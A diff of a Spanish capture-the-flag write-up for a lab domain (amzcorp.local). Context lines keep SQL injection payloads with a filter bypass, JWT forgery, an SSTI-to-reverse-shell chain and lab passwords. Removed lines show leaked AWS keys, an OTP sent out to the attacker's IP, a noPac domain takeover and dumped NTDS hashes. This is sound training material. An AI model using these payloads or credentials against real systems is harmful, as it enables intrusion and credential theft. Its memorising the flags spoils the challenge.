@@ -1,10 +1,6 @@
 
 ### Early Access
 
-#### AWS{S1mPl3_iD0R_4_4dm1N}
-
-  
-
 Iniciamos la máquina escaneando los puertos de la máquina con `nmap` donde encontramos varios puertos abiertos, muchos de ellos son propios de un `DC`
 
 ```
@@ -61,13 +57,7 @@ Para posibles proximos ataques o solo por comodidad agregaremos el `dominio` al 
 
 Al intentar acceder a la web desde el navegador encontramos que nos devuelve un error ya que no sabe a donde resolver usando el dominio `jobs.amzcorp.local`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/1.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/1.png)
+![image](../../../Imágenes/20250521161608.png)
 
 Para solucionar este problema podemos agregar el nuevo subdominio al `/etc/hosts`
 
@@ -76,62 +66,27 @@ Para solucionar este problema podemos agregar el nuevo subdominio al `/etc/hosts
 ```
 
   
-
 Recargamos la página y nos encontramos con un `login` y aunque no tenemos credenciales para acceder podemos crear una nueva cuenta como el usuario `test`
 
-[
+![image](../../../Imágenes/20250521161641.png)
 
-![](https://xchg2pwn.github.io/fortresses/aws/2.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/2.png)[
-
-![](https://xchg2pwn.github.io/fortresses/aws/6.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/6.png)
+![image](../../../Imágenes/20250521161709.png)
 
 Despues de registrar el usuario podemos iniciar sesión en el login y obtenemos acceso a un panel de AWS donde realmente no podemos hacer demasiado actualmente
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/8.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/8.png)
+![image](../../../Imágenes/20250521161750.png)
 
 Mirando el codigo fuente encontramos que carga un script .js llamado `app.js`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/3.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/3.png)
+![image](../../../Imágenes/20250521161810.png)
 
 Al abrirlo podemos notar que esta `ofuscado` y es imposible de leerlo de esa forma
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/4.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/4.png)
+![image](../../../Imágenes/20250521161831.png)
 
 Para desofuscarlo podemos usar [de4js](https://lelinhtinh.github.io/de4js/) donde si le pasamos el archivo podemos leer todo el codigo en `javascript` que ahora nos es completamente legible
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/5.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/5.png)
+![image](../../../Imágenes/20250521161909.png)
 
 Una función interesante es `GetToken`, esta envia en base64 una estructura `json` pasandole username y `uuid` que son parametros ingresados por un usuario cliente
 
@@ -207,15 +162,9 @@ Ejecutamos el script y despues de unos segundos aplicando fuerza bruta llega al 
 }
 ```
 
-  
-
-  
-
+ 
 ### Inspector
 
-#### AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
-
-  
 
 Despues de buscar mas rutas de la api encontramos `status` y hacerle un simple `curl` nos devuelve un json que curiosamente tiene varios `subdominios` existentes
 
@@ -314,15 +263,8 @@ Jugando con expresiones regulares podemos tomar del campo hostname solo la data 
 AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
 ```
 
-  
-
-  
-
 ### Statement
 
-#### AWS{MySqL_T1m3_B453d_1nJ3c71on5_4_7h3_w1N}
-
-  
 
 Si buscamos por la cadena `password` en el json encontramos una petición en la que se envia por `GET` la data de una contraseña perdida, el problema es que manda la contraseña para `tyler` en texto plano asi que al urldecodearla podemos verla
 
@@ -341,13 +283,7 @@ Si buscamos por la cadena `password` en el json encontramos una petición en la 
 
 Al urldecodear el campo `password` logramos ver la contraseña `{pXDWXyZ&>3h''W<` con la que podemos iniciar sesión como el usuario `tyler` en el subdominio jobs
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/9.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/9.png)
+![image](../../../Imágenes/20250521162008.png)
 
 Volviendo al `json` que dumpeamos en el campo `hostname` encontramos varios subdominios, al quitar las repeticiones encontramos 2 entre ellos `jobs-development`
 
@@ -443,13 +379,7 @@ Finalmente hacemos la peticion con la data en base64 dentro de `update_user` par
 
 Despues de volver a iniciar sesión el usuario test tiene acceso como `admin` en jobs
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/10.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/10.png)
+![image](../../../Imágenes/20250521162035.png)
 
 Una ruta disponible cuando nos autenticamos como `admin` es el buscador que tiene una posible `sqli`, aunque algo importante es que tiene una `blacklist`, sin embargo podemos bypassearla facilmente cambiando cosas como `union` por `Union`
 
@@ -485,26 +415,13 @@ test' order by 10-- -
 ```
 
   
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/11.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/11.png)
+![image](../../../Imágenes/20250521162101.png)
 
 ```
 test' order by 5-- -  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/12.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/12.png)
+![image](../../../Imágenes/20250521162128.png)
 
 Con `union` podemos representar las columnas con numeros y a partir de ahi trabajar
 
@@ -512,14 +429,7 @@ Con `union` podemos representar las columnas con numeros y a partir de ahi traba
 ' Union Select 1,2,3,4,5-- -  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/13.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/13.png)
+![image](../../../Imágenes/20250521162150.png)
 
 Podemos dumpear los nombres de las `bases de datos` donde el unico que llama la atención es la base de datos `jobs` que es la que esta actualmente en uso
 
@@ -528,13 +438,7 @@ Podemos dumpear los nombres de las `bases de datos` donde el unico que llama la 
 ```
 
   
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/14.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/14.png)
+![image](../../../Imágenes/20250521162214.png)
 
 Ya con un nombre de `db` podemos dumpear sus tablas, a partir de la base de datos `jobs` encontramos algunas `tablas` interesantes como `users` o `keys_tbl`
 
@@ -542,14 +446,7 @@ Ya con un nombre de `db` podemos dumpear sus tablas, a partir de la base de dato
 ' Union Select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='jobs'-- -  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/15.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/15.png)
+![image](../../../Imágenes/20250521162241.png)
 
 Iniciemos con `keys_tbl`, tabla de la cual podemos enumerar las columnas que son 3 en total, de las cuales solo nos interesan 2 y estas son `key_name` y `key_value`
 
@@ -557,14 +454,7 @@ Iniciemos con `keys_tbl`, tabla de la cual podemos enumerar las columnas que son
 ' Union Select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema='jobs' and table_name='keys_tbl'-- -  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/41.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/41.png)
+![image](../../../Imágenes/20250521162312.png)
 
 Finalmente dumpeamos esas 2 columnas de la tabla `keys_tbl` y ademas de posibles claves para el servicio `AWS` encontramos la tercera `flag` en uno de los valores
 
@@ -572,42 +462,18 @@ Finalmente dumpeamos esas 2 columnas de la tabla `keys_tbl` y ademas de posibles
 ' Union Select 1,group_concat(key_name,':',key_value),3,4,5 from keys_tbl-- -  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/16.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/16.png)
-
-  
+![image](../../../Imágenes/20250521162337.png) 
 
 ### Relentless
 
-#### AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
-
-  
 
 Antes también habiamos encontrado un subdominio `company-support` con un login
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/17.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/17.png)
+![image](../../../Imágenes/20250521162429.png)
 
 Sin embargo despues de registrar un usuario e iniciar sesión devuelve `Access denied` ya que la cuanta recien creada no ha sido habilitada y no tiene ningun permiso
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/18.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/18.png)
+![image](../../../Imágenes/20250521162447.png)
 
 En el codigo fuente dumpeado desde el `.git` encontramos el funcionamiento, necesitamos crear un codigo a partir de el usuario y la contraseña con `URLSafeSerializer` y se puede enviarlo a `/confirm-account` ya sea por GET o POST
 
@@ -644,29 +510,12 @@ Ya que creamos un usuario `test` con contraseña `test` podemos calcular el codi
 
 Al enviarlo a `/confirm-account` nos devuelve que se ha confirmado la cuenta y al iniciar sesión de nuevo obtenemos acceso al portal de `company-support`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/19.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/19.png)[
-
-![](https://xchg2pwn.github.io/fortresses/aws/20.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/20.png)
+![image](../../../Imágenes/20250521162527.png)
+![image](../../../Imágenes/20250521162600.png)
 
 Algo interesante es que nos dice que el usuario `tony` revisará todas las solicitudes
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/21.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/21.png)
+![image](../../../Imágenes/20250521162629.png)
 
 Revisando de nuevo el codigo desde `.git` encontramos un archivo `custom_jwt.py` donde podemos ver como se crea una `cookie` con criptografia `ecdsa` debil
 
@@ -840,14 +689,7 @@ Al ejecutar el script nos dara el jwt del usuario `tony` firmado y al modificar 
 eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIZHKzQu-bjKLJ9ycHelaB_ruPZOP2I2ImO64_dJmT3qjQ  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/22.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/22.png)
+![image](../../../Imágenes/20250521162656.png)
 
 Volviendo al codigo del `git` en una función de este podemos ver una vulnerabilidad de `SSTI` ya que usa la funcion `render_template_string` para mostrar los datos
 
@@ -888,23 +730,11 @@ def view_ticket(id):
 
 Podemos enviar el clasico payload `{{7*7}}` para ver si este se logra interpretar
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/23.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/23.png)
+![image](../../../Imágenes/20250521162716.png)
 
 En el panel que tenemos como admin podemos ver los tickets y en el campo subject donde enviamos `{{7*7}}` encontramos `49` lo que significa que se ha interpretado
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/24.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/24.png)
+![image](../../../Imágenes/20250521162737.png)
 
 Tenemos varias limitaciones, ya que en el codigo hay una `blacklist` para varios campos, sin embargo en ningun momento valida `subject` asi que usaremos ese
 
@@ -934,29 +764,12 @@ Podemos usar un [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tr
 
 Enviamos el payload en el campo `subject` creando un ticket y lo podemos ver reflejado como `admin` donde solo devuelve la respuesta en formato bytes `b''`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/25.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/25.png)[
-
-![](https://xchg2pwn.github.io/fortresses/aws/26.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/26.png)
+![image](../../../Imágenes/20250521162803.png)
+![image](../../../Imágenes/20250521162826.png)
 
 Podemos pasarle un comando como id en el campo `cmd` que definimos por ejemplo `?cmd=id` y al ejecutarlo podemos ver reflejado el output del comando por `www-data`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/27.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/27.png)
+![image](../../../Imágenes/20250521162854.png)
 
 Ya que ejecutamos comandos para evitar problemas con `comillas` y la blacklist podemos crear un archivo `index.html` que contenga una revshell en `bash` y compartirla, despues descargamos el archivo con `wget` y lo ejecutamos con bash
 
@@ -992,15 +805,7 @@ AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
 www-data@0474e1401baa:~/web$
 ```
 
-  
-
-  
-
 ### Magnified
-
-#### AWS{r3v3r51ng_1mpl4nt5_1s_fun}
-
-  
 
 Buscando por archivos con privilegios `suid` encontramos uno fuera de lo comun que es `backup_tool` el archivo pertenece al usuario `root` y podria hacer un setuid
 
@@ -1023,17 +828,9 @@ www-data@0474e1401baa:~$ ls -l /usr/bin/backup_tool
 www-data@0474e1401baa:~$
 ```
 
-  
-
 Para saber lo que hace por detras podemos usar un decompilador como lo es `ida`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/28.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/28.png)
+![image](../../../Imágenes/20250521163029.png)
 
 Iniciemos por la función main esta hace un `setguid` y `setuid` a `0` que es el id de `root`, seguido de eso simplemente llama a la función `a()` y sale del programa
 
@@ -1046,8 +843,6 @@ int __fastcall main(int argc, const char **argv, const char **envp)
   return 0;
 }
 ```
-
-  
 
 Seguido de eso el programa pide varios datos antes de llamar a la funcion `l_m()`, los valores son `username`, `password` y `otp`, y se usan funciones para obtenerlos
 
@@ -1122,8 +917,6 @@ puts("Incorrect Credentials!"Incorrect Credentials!
 exit(1 <no return ...>
 +++ exited (status 1) +++
 ```
-
-  
 
 El codigo otp depende de la `hora` asi que sera necesario sincronizarla con la del DC, despues en `gdb` aplicamos un breakpoint antes del ret de la funcion `g_o()` que se usa para obtenerlo, corremos el programa con las credenciales y cuando este llega al `breakpoint` el codigo se guardara en el registro `$rax` que podemos ver con `p`
 
@@ -1238,15 +1031,9 @@ Enter choice: 2
 Secret: AWS{r3v3r51ng_1mpl4nt5_1s_fun}  
 ```
 
-  
-
-  
 
 ### Shortcut
 
-#### AWS{uN1x1f13d_4_l0t!}
-
-  
 
 Volviendo al codigo decompilado podemos ver el caso `1` que llama a la funcion `a_b()` que al parecer modifica el `shadow` para agregar un hash del usuario tom
 
@@ -1391,15 +1178,7 @@ AWS{uN1x1f13d_4_l0t!}
 rootz@0474e1401baa:~#
 ```
 
-  
-
-  
-
 ### Long Run
-
-#### AWS{h4ng_1n_th3r3_f0r_m0r3_cl0ud}
-
-  
 
 Algo curioso es que el usuario root tiene un correo en `/var/mail/root` donde se le pide activar al usuario `jameshauwnnel` como cuenta en el dominio del DC
 
@@ -1676,47 +1455,18 @@ AWS{h4ng_1n_th3r3_f0r_m0r3_cl0ud}
 PS C:\Users\david\Documents>
 ```
 
-  
-
-  
-
 ### Jerry-built
 
-#### AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}
-
-  
 
 Ademas de las credenciales de `david` para winrm las credenciales de `olivia` nos sirven para iniciar sesión en el subdominio `workflow` que corre airflow por detras
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/30.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/30.png)[
-
-![](https://xchg2pwn.github.io/fortresses/aws/31.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/31.png)
+![image](../../../Imágenes/20250521163148.png)
+![image](../../../Imágenes/20250521163215.png)
 
 En `Admin > Variables` podemos encontrar variables que contienen claves de `AWS` podemos seleccionar ambas y darle a `export`, esto nos creara un archivo json
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/32.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/32.png)[
-
-![](https://xchg2pwn.github.io/fortresses/aws/33.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/33.png)
+![image](../../../Imágenes/20250521163241.png)
+![image](../../../Imágenes/20250521163259.png)
 
 Este archivo `json` contiene los 2 valores que necesitamos para la credencial aws
 
@@ -1930,24 +1680,11 @@ La variable `http_proxy` aws la usa para pasar por un proxy, la exportamos y env
 ❯ export http_proxy=http://127.0.0.1:8080  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/34.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/34.png)
+![image](../../../Imágenes/20250521163322.png)
 
 Arrastrando los `headers` de autenticacion y cambiando la ruta al `code` que veiamos en la funcion podemos ver una data que parece ser de un archivo `zip`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/35.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/35.png)
+![image](../../../Imágenes/20250521163342.png)
 
 Exportamos la data en un archivo `code.zip` y al extraer los archivos nos deja 2, un archivo `code.py` con la configuracion y un archivo `flag.txt` con la flag
 
@@ -2025,15 +1762,8 @@ AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}
 bash-4.2$
 ```
 
-  
-
-  
-
 ### Line Up
 
-#### AWS{th4ts_4_l0ng_Q}
-
-  
 
 Ya como administradores sobre el servicio `aws` podemos listar los queues bajo `sqs`, nos encontramos con `sensor_updates` de la que podemos recibir mensajes
 
@@ -2080,15 +1810,8 @@ Usando `receive-message` logramos recibir mensajes bajo ese `queue`, el primero 
 }
 ```
 
-  
-
-  
-
 ### Demolish
 
-#### AWS{wr3ck3d_r3s1st0r}
-
-  
 
 Tambien podemos listar los objetos del bucket `databases`, el unico objeto que llama la atención es el `amzcorp_users.db` que podria obtener credenciales
 
@@ -2165,13 +1888,7 @@ Podemos hacer un `get-object` para descargar el amzcorp_users.db a nuestro equip
 
 Al ser un archivo de formato `sqlite3` podemos abrirlo con `sqlitebrowser`, en la tabla `users` encontramos diferentes usuarios con sus posibles contraseñas
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/29.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/29.png)
+![image](../../../Imágenes/20250521163429.png)
 
 Creamos una lista con las contraseñas y al probarlas para el usuario `Administrator` encontramos una que devuelve valida y este al ser admin tambien un `Pwn3d!`
 
@@ -2197,239 +1914,3 @@ PS C:\Users\Administrator\Documents>
 ```
 
   
-
-  
-
-### Extra 1
-
-#### AWS SNS - Access Inventory
-
-  
-
-Volvamos a la inyección sql donde obteniamos un par de claves para el servicio `aws`
-
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/16.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/16.png)
-
-Configuramos `aws` proporcionando las claves, y usando de endpoint el subdominio reservado `cloud` hacemos una llamada `sts` para ver el usuario actual que es `roy`
-
-```
-❯ aws configure
-AWS Access Key ID [None]: AKIA3G38BCN8SCJORKFL
-AWS Secret Access Key [None]: GMTENUBiGygBeyOc+GpXsOfbQFfa3GGvpvb1fAjf  
-Default region name [None]: eu-east-1
-Default output format [None]:
-```
-
-  
-
-```
-❯ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq  
-{
-  "UserId": "AKIAD04C7G3J9F8G8320",
-  "Account": "000000000000",
-  "Arn": "arn:aws:iam::000000000000:user/roy"
-}
-```
-
-  
-
-Ademas de eso si dumpeamos la tabla `inventory` obtenemos las credenciales del usuario `robert` probablemente para autenticarse en el `subdominio` inventory
-
-```
-' Union Select 1,group_concat(username,':',password),3,4,5 from inventory-- -  
-```
-
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/36.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/36.png)
-
-Lo que podemos hacer es entrar con las credenciales de `robert` al subdominio `inventory`, sin embargo al hacerlo nos pide un codigo de autenticacion `otp`
-
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/37.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/37.png)[
-
-![](https://xchg2pwn.github.io/fortresses/aws/38.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/38.png)
-
-Volviendo a aws usando el protocolo `sns` podemos listar los `topics` y hay uno relacionado con lo que necesitamos ya que en su nombre lleva la string `otp`
-
-```
-❯ aws --endpoint-url http://cloud.amzcorp.local sns list-topics | jq  
-{
-  "Topics": [
-    {
-      "TopicArn": "arn:aws:sns:us-east-1:000000000000:otp"
-    }
-  ]
-}
-```
-
-  
-
-Usando `sns suscribe` y el `topic-arn` podemos hacer que nos envie las notificaciones a un servidor que montemos, en este caso por `http` a nuestra ip
-
-```
-❯ aws --endpoint-url http://cloud.amzcorp.local sns subscribe --topic-arn "arn:aws:sns:us-east-1:000000000000:otp" --protocol http --notification-endpoint http://10.10.14.10 | jq  
-{
-  "SubscriptionArn": "arn:aws:sns:us-east-1:000000000000:otp:e38a7615-6ce9-45d4-9d93-1948027044b8"
-}
-```
-
-  
-
-Volvemos a enviar la petición y recibimos una data en `json` y en uno de los campos llamado `Message` hay otro json que contiene un campo `otp` con el codigo
-
-```
-❯ sudo netcat -lvnp 80 
-Listening on 0.0.0.0 80
-Connection received on 10.13.37.15
-POST / HTTP/1.1
-Host: 10.10.14.10
-User-Agent: Amazon Simple Notification Service Agent
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Content-Type: text/plain
-x-amz-sns-message-type: Notification
-x-amz-sns-topic-arn: arn:aws:sns:us-east-1:000000000000:otp
-x-amz-sns-subscription-arn: arn:aws:sns:us-east-1:000000000000:otp:e38a7615-6ce9-45d4-9d93-1948027044b8
-Content-Length: 529
-
-{"Type": "Notification", "MessageId": "73879b38-ee9f-4c0b-be3f-b4a17316c29d", "TopicArn": "arn:aws:sns:us-east-1:000000000000:otp", "Message": "{\"otp\": \"70809372\"}", "Timestamp": "2023-09-21T02:28:43.026Z", "SignatureVersion": "1", "Signature": "EXAMPLEpH+..", "SigningCertURL": "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-0000000000000000000000.pem", "UnsubscribeURL": "http://localhost:4566/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:000000000000:otp:e38a7615-6ce9-45d4-9d93-1948027044b8"}  
-```
-
-  
-
-Ya con el `otp` podemos enviarlo y nos autentica correctamente hacia `inventory`
-
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/39.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/39.png)
-
-Aunque obtenemos acceso al panel de `inventory` despues de buscar un rato parece que no nos lleva a ningun lado que no sean explotaciones sin ninguna salida
-
-[
-
-![](https://xchg2pwn.github.io/fortresses/aws/40.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/aws/40.png)
-
-  
-
-### Extra 2
-
-#### CVE-2021-42278 / CVE-2021-42287 - DC1 Administrator
-
-  
-
-Como alternativa despues de obtener credenciales de dominio a traves del ASREPRoast podemos explotar [noPac](https://github.com/Ridter/noPac) donde logramos obtener una shell en el equipo DC01 como el usuario `nt authority\system` que tiene privilegios maximos
-
-```
-❯ python3 noPac.py amzcorp.local/jameshauwnnel:654221p! -shell -use-ldap -dc-ip 10.13.37.15
-
-███    ██  ██████  ██████   █████   ██████ 
-████   ██ ██    ██ ██   ██ ██   ██ ██      
-██ ██  ██ ██    ██ ██████  ███████ ██      
-██  ██ ██ ██    ██ ██      ██   ██ ██      
-██   ████  ██████  ██      ██   ██  ██████ 
-    
-[*] Current ms-DS-MachineAccountQuota = 10
-[*] Selected Target dc01.amzcorp.local
-[*] Total Domain Admins 1
-[*] will try to impersonate Administrator
-[*] Adding Computer Account "WIN-PTAUQIHGKYY$"
-[*] MachineAccount "WIN-PTAUQIHGKYY$" password = WW4zqh8)ArrU
-[*] Successfully added machine account WIN-PTAUQIHGKYY$ with password WW4zqh8)ArrU.
-[*] WIN-PTAUQIHGKYY$ object = CN=WIN-PTAUQIHGKYY,CN=Computers,DC=amzcorp,DC=local
-[*] WIN-PTAUQIHGKYY$ sAMAccountName == dc01
-[*] Saving a DC's ticket in dc01.ccache
-[*] Reseting the machine account to WIN-PTAUQIHGKYY$
-[*] Restored WIN-PTAUQIHGKYY$ sAMAccountName to original value
-[*] Using TGT from cache
-[*] Impersonating Administrator
-[*] 	Requesting S4U2self
-[*] Saving a user's ticket in Administrator.ccache
-[*] Rename ccache to Administrator_dc01.amzcorp.local.ccache
-[*] Attempting to del a computer with the name: WIN-PTAUQIHGKYY$
-[-] Delete computer WIN-PTAUQIHGKYY$ Failed! Maybe the current user does not have permission.  
-[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
-[*] Exploiting..
-[!] Launching semi-interactive shell - Careful what you execute
-
-C:\Windows\system32>whoami
-nt authority\system
-
-C:\Windows\system32>
-```
-
-  
-
-Ademas de la shell que nos otorga nos crea un ticket kerberos como `Administrator` asi que autenticandonos con el podemos dumpear el `ntds` y los secretos `lsa`
-
-```
-❯ export KRB5CCNAME=Administrator_dc01.amzcorp.local.ccache
-
-❯ crackmapexec smb amzcorp.local -k --use-kcache --ntds drsuapi
-SMB         amzcorp.local   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
-SMB         amzcorp.local   445    DC01             [+] amzcorp.local\Administrator from ccache (Pwn3d!)
-SMB         amzcorp.local   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
-SMB         amzcorp.local   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c75e55141795c861a00825bbb18d189:::
-SMB         amzcorp.local   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         amzcorp.local   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26a32740e7db943b2cdd7fab724b4500:::
-SMB         amzcorp.local   445    DC01             amzcorp.local\david:1107:aad3b435b51404eeaad3b435b51404ee:825f207e2ea45404a350b17648450b2d:::
-SMB         amzcorp.local   445    DC01             amzcorp.local\jameshauwnnel:2101:aad3b435b51404eeaad3b435b51404ee:8c21a7fa1e905ebe1456a9ea6ce2f75f:::  
-SMB         amzcorp.local   445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:3f172f6ea10ccb450ff405a079a93dfa:::
-SMB         amzcorp.local   445    DC01             WIN-PTAUQIHGKYY$:12113:aad3b435b51404eeaad3b435b51404ee:4171e0c9ad0ff67089fab7fd757a1b59:::
-
-❯ crackmapexec smb amzcorp.local -k --use-kcache --lsa
-SMB         amzcorp.local   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
-SMB         amzcorp.local   445    DC01             [+] amzcorp.local\Administrator from ccache (Pwn3d!)
-SMB         amzcorp.local   445    DC01             [+] Dumping LSA secrets
-SMB         amzcorp.local   445    DC01             AMZCORP\DC01$:aes256-cts-hmac-sha1-96:06f498b90b6ace700cc45be4a94183c255fa7e7bf433834cf5cfbfc97ae58b90
-SMB         amzcorp.local   445    DC01             AMZCORP\DC01$:aes128-cts-hmac-sha1-96:528f548358a2318c439ce8d9404ae19a
-SMB         amzcorp.local   445    DC01             AMZCORP\DC01$:des-cbc-md5:737ae638dfd61a57
-SMB         amzcorp.local   445    DC01             AMZCORP\DC01$:plain_password_hex:75ea9ab92adecaccec92260712c77d9c3041cbb492eef798e84e85182f9240d12cf30e8e8c7931b9baed89cd262365a4817f1142c2ea3adf8c5a5ffcb845b1ee6f88319e8d0aab665729b78e8550787fda5a6c41e2a3776eb21f688f3e394c21c3418acc24fe7be4f57964ebc413192bbe75112db845dfadb59f6e605045bacdfdbf4c1789a3013307631a9aa6719e5ac70d5d09d7fff12eee04006f912cb17b01040ec2688b4c10d37df3442c49e66fed0708ea27673f7970a94d58bda96d9820acc3dd3cbc850b4e5e40c00cfdefc1e25a04e65490dcab076abedb43cd9d17d6bd9b5b01893254b8956ed132cdbf1e  
-SMB         amzcorp.local   445    DC01             AMZCORP\DC01$:aad3b435b51404eeaad3b435b51404ee:3f172f6ea10ccb450ff405a079a93dfa:::
-SMB         amzcorp.local   445    DC01             AMZCORP\Administrator:K2h3v4n@#!5_34
-SMB         amzcorp.local   445    DC01             dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
-dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
-SMB         amzcorp.local   445    DC01             NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1
-```
-
-  
-
-En los secretos `lsa` podemos ver una contraseña en texto claro para el usuario `Administrator`, podemos simplemente conectarnos con `evil-winrm` al DC
-
-```
-❯ evil-winrm -i amzcorp.local -u Administrator -p 'K2h3v4n@#!5_34'  
-PS C:\Users\Administrator\Documents> whoami
-amzcorp\administrator
-PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
-AWS{wr3ck3d_r3s1st0r}
-PS C:\Users\Administrator\Documents>
-```
